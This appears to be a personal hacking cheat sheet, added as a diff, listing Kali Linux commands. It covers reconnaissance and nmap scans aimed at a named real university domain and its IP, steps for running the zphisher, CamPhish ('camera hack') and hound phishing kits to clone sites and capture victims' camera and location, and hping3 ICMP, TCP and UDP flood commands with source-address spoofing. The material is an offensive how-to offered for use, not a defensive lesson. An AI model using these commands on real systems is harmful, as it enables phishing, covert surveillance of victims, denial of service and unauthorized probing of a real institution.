@@ -1,0 +1,107 @@
+─THIS for Passive recon's :->
+recons means Info gathering
+whois ([who.is]register info and number info)
+nslookup [IP's find] OR ping
+dig (IP address)
+host (IP address)
+dnsenum (NS=name server,MX=Mail  Exchange server A-IPv4, AAAA-IPv6,TXT-text record)
+dnsrecon -d (NS=name server,MX=Mail  Exchange server A-IPv4, AAAA-IPv6,TXT-text record)  IN THIS -d MEANS DOMAIN
+theHarvester -d ljku.edu.in -b all (gather osint from search engines)
+dnsdumpster.com (For find an full architecture of websites or all active IP's in which countrys) THIS IS A WEBSITE
+===================================================================================================================
+THIS for Active recon's :->
+dirb https://ljku.edu.in (This is for find page which is avilable in website [302:move or delete][200:still avilabel])
+sudo apt install sublist3r (for install sublist3r) 
+sublist3r -d ljku.edu.in
+sudo amass enum -d ljku.edu.in
+===================================================================================================================
+Command:-
+ping ljku.edu.in
+whois ljku.edu.in
+
+===================================================================================================================
+| Tool/Command    | Main Purpose             | Key Info Found                  |
+| --------------- | ------------------------ | ------------------------------- |
+| whois           | Domain registration info | Owner, registrar, contact       |
+| nslookup        | DNS resolution           | IPs, MX, NS                     |
+| ping            | Host reachability        | IP, latency                     |
+| dig             | Detailed DNS query       | A, MX, NS, TXT                  |
+| host            | Simple DNS lookup        | IP, record types                |
+| dnsenum         | DNS enumeration          | A, AAAA, MX, TXT, NS            |
+| dnsrecon -d     | DNS reconnaissance       | Same as dnsenum + zone transfer |
+| theHarvester    | OSINT gathering          | Emails, subdomains, IPs         |
+| dnsdumpster.com | Online recon             | Infrastructure map              |
+| dirb       | Directory brute-force           | `dirb <URL>`             | Hidden/linked pages & dirs |
+| sublist3r  | Subdomain discovery             | `sublist3r -d <domain>`  | Subdomains                 |
+| amass enum | Advanced subdomain + infra scan | `amass enum -d <domain>` | Subdomains, IPs, ASN       |
+
+ljku.edu.in IP address is 97.74.85.233
+===================================================================================================================
+NMap = Network Mapper
+ nmap<ip> -sn
+nmap 10.0.0.* -sn [which device have connect to this find the IP]
+sudo nmap ljku.edu.in -o
+nmap<ip>
+nmap<ip> -p
+namp<ip> -p 80,443
+sudo nmap <ip> -sV [service version]
+namp 97.74.85.233 [Show open port]
+nmap 97.74.85.233 -v [ v menas verbose bankend process show]
+nmap 97.74.85.233 -vv [vv menas very verbose detail backend activity]
+nmap 97.74.85.233 -Pn [If they blocked then for direct scan using bypass ping scan]
+nmap -traceroute ljku.edu.in []
+nmap 97.74.85.233 -O [find which OS is use]
+nmap 97.74.85.233 -Pn -sV
+nmap 97.74.85.233 -A [aggressive find -O,-sV,-traceroute,-portscanning,-NSE(find vulnetablity & data collection) this all are cover in one]
+===================================================================================================================
+Fake website clone
+search chrome zphisher github the copy  clone link
+ans paste in kali CMD
+git clone https://github.com/htr-tech/zphisher.git
+cd zphisher
+./zphisher.sh
+===================================================================================================================
+For Camera Hack Using CamPhish 
+git clone https://github.com/techchipnet/CamPhish
+cd CamPhish
+{ln CamPhish make sure camphish.sh and cloudflared file this two are in green color text if not 
+chmod 777 cloudflared}
+chmod 777 camphish.sh
+./camphish.sh
+OR
+bash camphish.sh
+===================================================================================================================
+For find location Hound
+git clone https://github.com/techchipnet/hound
+cd hound
+{ln hound make sure hound.sh and cloudflared file this two are in green color text}
+chmod 777 hound.sh
+./hound.sh
+===================================================================================================================
+--flood (many request to send a same time)
+ ipconfig -all
+ 192.168.0.82
+ 
+ --flood apo to dos Attack thai
+icmp
+sudo hping3 -1  192.168.0.82 
+windows click ->wireshark
+
+icmp slood
+many request to send a same time
+sudo hping3 -1  192.168.0.82 --flood
+
+TCPflood
+sudo hping3 -S  192.168.0.82 --flood
+
+UDP flood
+sudo hping3 -2  192.168.0.82 
+
+TCP ack flag
+sudo hping3 -1  192.168.0.82 
+
+change(spoof) a ip address(response leva mate)
+sudo hping3 -S  192.168.0.82  -a </ip address of kali linux> 10.176.253.67
+===================================================================================================================
+extra
+https://soclibrary.fuda.edu.ng
